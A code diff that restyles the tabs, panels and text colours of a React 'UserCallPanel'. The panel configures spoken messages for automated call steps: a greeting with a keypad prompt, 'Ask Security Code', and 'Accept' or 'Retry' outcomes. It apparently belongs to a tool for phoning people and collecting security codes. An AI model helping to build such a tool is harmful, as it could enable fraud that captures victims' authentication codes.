@@ -1374,21 +1374,38 @@ function UserCallPanel({ user, token, onLogout }) {
           </div>
 
           {/* Call Steps Configuration */}
-          <div className="form-section glass-panel p-3 rounded-lg mb-3" data-testid="call-steps-section">
+          <div className="form-section glass-panel p-4 rounded-xl mb-4" data-testid="call-steps-section">
             <h3 className="section-title">
               <Layers className="w-4 h-4" />
               Call Steps
             </h3>
             
             <Tabs value={activeStep} onValueChange={setActiveStep} className="w-full">
-              <TabsList className="w-full bg-black/40 border border-white/5 p-0.5 rounded-md h-7" data-testid="call-steps-tabs">
+              <TabsList className="w-full p-1 rounded-lg h-auto flex gap-1" 
+                style={{
+                  background: 'rgba(255, 255, 255, 0.03)',
+                  border: '1px solid rgba(255, 255, 255, 0.08)'
+                }}
+                data-testid="call-steps-tabs"
+              >
                 {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                   <TabsTrigger
                     key={step}
                     value={step}
-                    className={`flex-1 font-mono text-[10px] uppercase tracking-wider border border-transparent h-6
-                      data-[state=active]:bg-cyan-500/10 data-[state=active]:text-teal-600 data-[state=active]:border-cyan-500/30
-                      ${currentStep === step ? 'ring-1 ring-emerald-500/50' : ''}`}
+                    className="flex-1 font-mono text-[10px] uppercase tracking-wider py-2 px-2 rounded-md transition-all duration-300"
+                    style={{
+                      background: activeStep === step 
+                        ? 'linear-gradient(135deg, rgba(139, 92, 246, 0.3), rgba(168, 85, 247, 0.2))' 
+                        : 'transparent',
+                      border: activeStep === step 
+                        ? '1px solid rgba(139, 92, 246, 0.4)' 
+                        : '1px solid transparent',
+                      color: activeStep === step ? '#c4b5fd' : '#64748b',
+                      boxShadow: activeStep === step 
+                        ? '0 0 15px rgba(139, 92, 246, 0.3)' 
+                        : 'none',
+                      ...(currentStep === step ? { boxShadow: '0 0 15px rgba(16, 185, 129, 0.5), inset 0 0 10px rgba(16, 185, 129, 0.2)' } : {})
+                    }}
                     data-testid={`step-tab-${step}`}
                   >
                     {step === "accepted" ? "Accept" : step === "rejected" ? "Retry" : `S${step.slice(-1)}`}
@@ -1397,7 +1414,7 @@ function UserCallPanel({ user, token, onLogout }) {
               </TabsList>
               
               {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
-                <TabsContent key={step} value={step} className="mt-2">
+                <TabsContent key={step} value={step} className="mt-3">
                   <label className="form-label text-[9px]">
                     {step === "step1" && "Step 1 - Greetings (DTMF: 0/1)"}
                     {step === "step2" && "Step 2 - Ask Security Code"}
@@ -1408,12 +1425,12 @@ function UserCallPanel({ user, token, onLogout }) {
                   <Textarea
                     value={stepMessages[step]}
                     onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
-                    className="glass-input form-textarea text-gray-700"
+                    className="glass-input form-textarea"
                     placeholder={`TTS message for ${step}...`}
                     rows={2}
                     data-testid={`step-message-${step}`}
                   />
-                  <div className="mt-1 text-[9px] text-slate-500 font-mono">
+                  <div className="mt-1 text-[9px] text-white/40 font-mono">
                     Variables: {"{name}"}, {"{service}"}, {"{digits}"}
                   </div>
                 </TabsContent>
